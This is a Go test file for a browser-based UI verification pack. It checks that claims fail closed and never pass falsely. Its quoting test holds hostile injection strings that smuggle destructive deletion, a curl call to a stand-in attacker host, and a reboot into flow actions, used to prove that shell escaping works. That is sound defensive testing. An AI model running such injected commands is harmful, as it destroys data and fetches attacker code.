package ui

import (
	"context"
	"errors"
	"strings"
	"testing"

	"nilcore/internal/artifact"
	"nilcore/internal/artifact/evverify"
	"nilcore/internal/browserwire"
	"nilcore/internal/sandbox"
)

// fakeBox is a hermetic sandbox.Sandbox stand-in: it records the command and
// returns a canned Result/error so the driver branches of each check run without a
// real Chromium. No network, no browser — the live path is the browser-e2e CI job.
type fakeBox struct {
	lastCmd string
	execN   int
	exec    func(cmd string) (sandbox.Result, error)
}

func (b *fakeBox) Exec(_ context.Context, cmd string) (sandbox.Result, error) {
	b.lastCmd = cmd
	b.execN++
	if b.exec != nil {
		return b.exec(cmd)
	}
	return sandbox.Result{}, nil
}
func (b *fakeBox) ExecWithEnv(ctx context.Context, cmd string, _ map[string]string) (sandbox.Result, error) {
	return b.Exec(ctx, cmd)
}
func (b *fakeBox) Workdir() string { return "/work" }

// okBox returns a box whose driver exits 0 with the given JSON observation body.
func okBox(stdout string) *fakeBox {
	return &fakeBox{exec: func(string) (sandbox.Result, error) {
		return sandbox.Result{ExitCode: 0, Stdout: stdout}, nil
	}}
}

func claim(ev artifact.Evidence) artifact.Claim {
	return artifact.Claim{ID: "c1", Field: "f1", Evidence: ev}
}

func TestUIPack(t *testing.T) {
	ctx := context.Background()

	t.Run("RegisterAll registers exactly the three ids", func(t *testing.T) {
		r := evverify.New()
		for _, id := range []string{"ui.flow_passes", "ui.no_console_errors", "ui.screenshot_captured"} {
			if _, ok := r.Lookup(id); ok {
				t.Fatalf("id %q present before RegisterAll", id)
			}
		}
		RegisterAll(r)
		for _, id := range []string{"ui.flow_passes", "ui.no_console_errors", "ui.screenshot_captured"} {
			if _, ok := r.Lookup(id); !ok {
				t.Fatalf("id %q absent after RegisterAll", id)
			}
		}
		// And not a single extra id (e.g. a stray namespace) — exactly three.
		if _, ok := r.Lookup("ui.something_else"); ok {
			t.Fatal("unexpected extra ui id registered")
		}
	})

	t.Run("no_console_errors: empty console => Pass", func(t *testing.T) {
		box := okBox(`{"title":"Home","text":"hi","console":[],"screenshot_b64":""}`)
		st, _ := checkNoConsoleErrors(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st != artifact.StatusPass {
			t.Fatalf("empty console status = %q, want pass", st)
		}
		if box.execN != 1 {
			t.Fatalf("driver invoked %d times, want exactly 1", box.execN)
		}
	})

	t.Run("no_console_errors: non-empty console => Fail", func(t *testing.T) {
		box := okBox(`{"console":["TypeError: x is undefined"]}`)
		st, _ := checkNoConsoleErrors(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st != artifact.StatusFail {
			t.Fatalf("console-with-error status = %q, want fail", st)
		}
	})

	t.Run("no_console_errors: driver non-zero exit => Unverifiable", func(t *testing.T) {
		box := &fakeBox{exec: func(string) (sandbox.Result, error) {
			return sandbox.Result{ExitCode: 1, Stderr: "could not connect to browser"}, nil
		}}
		st, d := checkNoConsoleErrors(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st != artifact.StatusUnverifiable {
			t.Fatalf("driver-failure status = %q, want unverifiable", st)
		}
		if st == artifact.StatusPass {
			t.Fatal("a driver failure must never fabricate a Pass")
		}
		if d == "" {
			t.Fatal("expected a detail tail for the driver failure")
		}
	})

	t.Run("no_console_errors: unparseable driver output => Unverifiable", func(t *testing.T) {
		box := okBox(`not json at all`)
		st, _ := checkNoConsoleErrors(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st != artifact.StatusUnverifiable {
			t.Fatalf("unparseable status = %q, want unverifiable", st)
		}
	})

	t.Run("flow_passes: expected substring present => Pass", func(t *testing.T) {
		box := okBox(`{"title":"Order Confirmed","text":"Thank you for your purchase"}`)
		c := claim(artifact.Evidence{
			Value:            `[{"click":"#buy"}]`,
			ExtractionMethod: "order confirmed",
			SourceURL:        "https://shop.example.com",
		})
		st, _ := checkFlowPasses(ctx, box, c)
		if st != artifact.StatusPass {
			t.Fatalf("substring-present status = %q, want pass", st)
		}
	})

	t.Run("flow_passes: expected substring absent => Fail", func(t *testing.T) {
		box := okBox(`{"title":"Error","text":"Something went wrong"}`)
		c := claim(artifact.Evidence{
			Value:            `[{"click":"#buy"}]`,
			ExtractionMethod: "order confirmed",
		})
		st, _ := checkFlowPasses(ctx, box, c)
		if st != artifact.StatusFail {
			t.Fatalf("substring-absent status = %q, want fail", st)
		}
	})

	t.Run("flow_passes: empty flow Value => Unverifiable, never vacuous Pass", func(t *testing.T) {
		box := okBox(`{"title":"anything"}`)
		c := claim(artifact.Evidence{Value: "", ExtractionMethod: "anything"})
		st, _ := checkFlowPasses(ctx, box, c)
		if st != artifact.StatusUnverifiable {
			t.Fatalf("empty-value status = %q, want unverifiable", st)
		}
		if st == artifact.StatusPass {
			t.Fatal("empty flow must never Pass vacuously (NON-GOAL guard)")
		}
		if box.execN != 0 {
			t.Fatal("empty flow must not invoke the driver")
		}
	})

	t.Run("flow_passes: empty expected substring => Unverifiable", func(t *testing.T) {
		box := okBox(`{"title":"x"}`)
		c := claim(artifact.Evidence{Value: `[{"click":"#x"}]`, ExtractionMethod: ""})
		st, _ := checkFlowPasses(ctx, box, c)
		if st != artifact.StatusUnverifiable {
			t.Fatalf("empty-expect status = %q, want unverifiable", st)
		}
	})

	t.Run("screenshot_captured: present => Pass, absent => Fail", func(t *testing.T) {
		box := okBox(`{"screenshot_b64":"iVBORw0KGgo="}`)
		st, _ := checkScreenshotCaptured(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st != artifact.StatusPass {
			t.Fatalf("screenshot-present status = %q, want pass", st)
		}
		box2 := okBox(`{"screenshot_b64":""}`)
		st2, _ := checkScreenshotCaptured(ctx, box2, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
		if st2 != artifact.StatusFail {
			t.Fatalf("screenshot-absent status = %q, want fail", st2)
		}
	})

	t.Run("nil Box => Unverifiable on every check, no host-side request", func(t *testing.T) {
		for name, fn := range map[string]evverify.CheckFunc{
			"flow_passes":         checkFlowPasses,
			"no_console_errors":   checkNoConsoleErrors,
			"screenshot_captured": checkScreenshotCaptured,
		} {
			c := claim(artifact.Evidence{
				Value:            `[{"click":"#x"}]`,
				ExtractionMethod: "ok",
				SourceURL:        "https://app.example.com",
			})
			st, d := fn(ctx, nil, c)
			if st != artifact.StatusUnverifiable {
				t.Fatalf("%s nil-box status = %q, want unverifiable", name, st)
			}
			if !strings.Contains(strings.ToLower(d), "no sandbox") {
				t.Fatalf("%s nil-box detail %q should explain the missing sandbox", name, d)
			}
		}
	})

	t.Run("navigate-only check with no URL and no flow => Unverifiable", func(t *testing.T) {
		box := okBox(`{}`)
		st, _ := checkNoConsoleErrors(ctx, box, claim(artifact.Evidence{}))
		if st != artifact.StatusUnverifiable {
			t.Fatalf("no-target status = %q, want unverifiable", st)
		}
		if box.execN != 0 {
			t.Fatal("a check with nothing to observe must not invoke the driver")
		}
	})
}

// TestUIPackQuoting is the I4 quoting-boundary test: model-supplied flow actions
// carrying single quotes, backslashes, $(), and newlines must be quoted via
// browserwire.ShellSingleQuote so the driver command stays EXACTLY ONE invocation —
// the embedded bytes can never break out to a second command.
func TestUIPackQuoting(t *testing.T) {
	ctx := context.Background()

	hostile := []string{
		`[{"type":"' ; rm -rf / ;'"}]`,
		`[{"text":"$(curl evil.example.com)"}]`,
		`[{"text":"a\\b'c"}]`,
		"[{\"text\":\"line1\nline2\"}]",
		`[{"text":"back\\slash"}]`,
		`[{"sel":"' && reboot && '"}]`,
	}

	for _, actions := range hostile {
		box := okBox(`{"title":"ok","text":"done"}`)
		c := claim(artifact.Evidence{Value: actions, ExtractionMethod: "done"})
		if _, _ = checkFlowPasses(ctx, box, c); box.execN != 1 {
			t.Fatalf("actions %q caused %d invocations, want exactly 1", actions, box.execN)
		}

		// The exact ShellSingleQuote rendering of the actions must be a substring of the
		// command (proving the model bytes were quoted, not concatenated raw), and the
		// command must remain a single nilcore-browser invocation (no second driver call,
		// no unescaped breakout).
		want := browserwire.ShellSingleQuote(actions)
		if !strings.Contains(box.lastCmd, want) {
			t.Fatalf("cmd %q does not contain the single-quoted actions %q", box.lastCmd, want)
		}
		if strings.Count(box.lastCmd, defaultBrowserDriver) != 1 {
			t.Fatalf("cmd %q invokes the driver %d times, want exactly 1", box.lastCmd, strings.Count(box.lastCmd, defaultBrowserDriver))
		}
		// The raw single-quote inside the actions must NOT appear unescaped as a lone `'`
		// that closes the quoting: ShellSingleQuote rewrites every `'` to `'\''`.
		if strings.Contains(actions, "'") && !strings.Contains(box.lastCmd, `'\''`) {
			t.Fatalf("cmd %q did not escape an embedded single quote", box.lastCmd)
		}
	}
}

// sandboxErrIsUnverifiable confirms a sandbox-level error (the box could not run the
// command at all) fails closed rather than surfacing a Go error or a Pass.
func TestUIPackSandboxError(t *testing.T) {
	ctx := context.Background()
	box := &fakeBox{exec: func(string) (sandbox.Result, error) {
		return sandbox.Result{}, errors.New("box exploded")
	}}
	st, _ := checkScreenshotCaptured(ctx, box, claim(artifact.Evidence{SourceURL: "https://app.example.com"}))
	if st != artifact.StatusUnverifiable {
		t.Fatalf("sandbox-error status = %q, want unverifiable", st)
	}
}

// TestUIPackRegisteredCheckRuns confirms the ids registered via RegisterAll resolve
// through the Registry and run the real check (not an always-pass stub): an
// unreachable driver yields Unverifiable, never Pass, for every registered id.
func TestUIPackRegisteredCheckRuns(t *testing.T) {
	ctx := context.Background()
	r := evverify.New()
	RegisterAll(r)
	unreachable := &fakeBox{exec: func(string) (sandbox.Result, error) {
		return sandbox.Result{ExitCode: 1, Stderr: "no browser"}, nil
	}}
	for _, id := range []string{"ui.flow_passes", "ui.no_console_errors", "ui.screenshot_captured"} {
		c := artifact.Claim{
			ID:    "c1",
			Field: "f1",
			Evidence: artifact.Evidence{
				Verifier:         id,
				Value:            `[{"click":"#x"}]`,
				ExtractionMethod: "x",
				SourceURL:        "https://app.example.com",
			},
		}
		st, _ := r.Resolve(ctx, unreachable, c)
		if st == artifact.StatusPass {
			t.Fatalf("id %q PASSed against an unreachable driver — always-pass verifier", id)
		}
	}
}
